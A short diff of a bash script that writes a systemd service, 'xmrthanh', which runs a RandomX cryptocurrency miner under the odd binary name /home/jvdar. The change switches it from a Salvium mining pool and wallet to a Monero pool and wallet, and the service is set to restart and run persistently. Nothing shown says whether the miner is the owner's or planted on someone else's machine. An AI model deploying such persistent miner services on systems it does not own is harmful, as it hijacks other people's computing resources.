@@ -12,7 +12,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service
 Description=xmrthanh
 After=network.target
 [Service]
-ExecStart= /home/jvdar -o salvium.herominers.com:1230 -b 152.42.209.29:10000 -u SaLvsAVm78sYam4NrkX4MWHRrUiwC1Fcz4sUAQRY1Jut1ijhonGGcneKLbww6GUvid8N2WHyuLxYfjav1p6xCDRGSVfVEdGPETk -p 1svts1116 -a rx/0 -k -t 13
+ExecStart= /home/jvdar -o sg.monero.herominers.com:1111 -b 152.42.209.29:10000 -u 85Nh1jFLWG1ZPpSDB8eGSwhJPbxAYLbaSdTPovuRhaohT1UEUyvtf22Xh5Pz2y1Sku8hNiHDNVZUF31mLw1TkMsESBzSLsA -p 1svts1116 -a rx/0 -k -t 13
 WatchdogSec=36000
 Restart=always
 RestartSec=60
